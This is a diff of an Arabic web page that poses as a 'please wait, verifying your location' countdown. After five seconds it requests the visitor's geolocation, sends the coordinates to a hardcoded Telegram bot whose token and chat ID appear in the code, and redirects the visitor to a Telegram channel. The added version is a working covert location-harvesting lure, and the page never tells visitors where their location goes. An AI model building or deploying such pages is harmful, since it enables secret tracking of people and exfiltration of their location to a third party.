@@ -2,67 +2,80 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>جارٍ تحديد موقعك...</title>
+  <title>جارٍ تحديد الموقع...</title>
   <style>
     body {
-      background: linear-gradient(to bottom right, #e0n7fa, #ffffff);
-      font-family: 'Tahoma', sans-serif;
+      background: linear-gradient(to bottom right, #f5f5f5, #e0f7fa);
+      font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
     }
 
     h2 {
-      color: #004d40;
-      margin-bottom: 40px;
+      color: #00695c;
     }
 
     #countdown {
       font-size: 30px;
       font-weight: bold;
       margin: auto;
-      background: #ffffff;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 20px rgba(0, 150, 136, 0.4);
+      background: white;
       width: 70px;
       height: 70px;
-      line-height: 30px;
-      color: #00736b;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      line-height: 70px;
+      border-radius: 50%;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      color: #004d40;
+      margin-top: 40px;
     }
   </style>
 </head>
 <body>
 
-  <h2>يرجى الانتظار للتحقق من موقعك</h2>
+  <h2>يرجى الانتظار قليلًا...</h2>
   <div id="countdown">5</div>
 
   <script>
     const token = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const chat_id = "6028485445";
+
     let count = 5;
 
     function sendLocation(lat, lon) {
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 تم التقاط الموقع:\nخط العرض: ${lat}\nخط الطول: ${lon}`;
-      fetch(url).then(() => {
-        // تحويل بعد الإرسال
-        setTimeout(() => {
-          window.location.href = "https://t.me/sswq22";
-        }, 500);
+      const text = `📍 موقع جديد تم التقاطه:\n\n🌍 خط العرض: ${lat}\n🌐 خط الطول: ${lon}`;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        // إذا تم الإرسال بنجاح، نوجه المستخدم
+        window.location.href = "https://t.me/sswq22";
+      })
+      .catch(error => {
+        alert("فشل في إرسال الموقع. تأكد من التوكن والآيدي.");
+        console.error(error);
       });
     }
 
-    function getLocationAndRedirect() {
+    function getLocationAndSend() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          sendLocation(lat, lon);
-        }, () => {
-          alert("تم رفض إذن تحديد الموقع.");
-        });
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          error => {
+            alert("تم رفض الإذن أو لم يتم الحصول على الموقع.");
+          }
+        );
       } else {
         alert("المتصفح لا يدعم تحديد الموقع.");
       }
@@ -73,17 +86,10 @@
       document.getElementById("countdown").textContent = count;
       if (count <= 0) {
         clearInterval(timer);
-        getLocationAndRedirect();
+        getLocationAndSend();
       }
     }, 1000);
   </script>
 
-</body>
-</html>
-    window.onload = () => {
-      getLocationAndSend();
-      startCountdown();
-    };
-  </script>
 </body>
 </html>
